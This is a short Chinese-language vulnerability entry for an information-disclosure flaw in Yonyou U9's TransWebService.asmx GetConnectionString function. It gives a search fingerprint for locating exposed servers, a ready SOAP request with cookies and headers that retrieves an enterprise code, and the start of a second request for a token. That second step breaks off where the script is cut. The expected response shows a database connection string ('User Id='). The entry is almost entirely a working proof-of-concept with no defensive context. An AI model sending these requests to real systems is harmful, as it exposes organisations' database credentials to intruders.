# 用友U9GetConnectionString存在信息泄露漏洞

- **系统**：用友　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="logo-u9.png"`
- **请求**：`POST /CS/Office/TransWebService.asmx HTTP/1.1`

**请求体 / payload**
```
1.获取code
Host:
Cookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g
Priority: u=1
SOAPAction: [http://tempuri.org/GetEnterprise](http://tempuri.org/GetEnterprise)
Content-Type: text/xml;charset=UTF-8
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetEnterprise/>
</soap:Body>
</soap:Envelope>
2.使用上一步获取的code获取token
1.
POST /CS/Office/TransWebService.asmx HTTP/1.1
Cookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTE…（脚本共 1701 字，完整版见原文）
```
- **预期**：200　|　User Id=